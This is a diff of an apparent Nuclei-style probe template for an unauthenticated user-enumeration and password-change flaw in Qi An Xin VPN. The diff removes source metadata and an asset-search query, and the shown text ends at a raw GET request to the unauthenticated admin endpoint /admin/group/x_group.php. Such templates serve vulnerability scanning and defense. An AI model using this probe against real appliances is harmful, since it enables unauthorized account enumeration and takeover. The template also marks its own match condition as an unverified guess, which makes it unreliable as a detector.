@@ -3,14 +3,8 @@ info:
   name: 奇安信VPN存在未授权管理用户遍历及任意账号密码修改漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/b5d0be9de83c3c7d2705c0e0fae94b0f
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: info-leak,unauth,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: b5d0be9de83c3c7d2705c0e0fae94b0f
-    fofa: + hunter`app.name="奇安信 VPN"`
 http:
 - raw:
   - 'GET /admin/group/x_group.php?id=1 HTTP/1.1
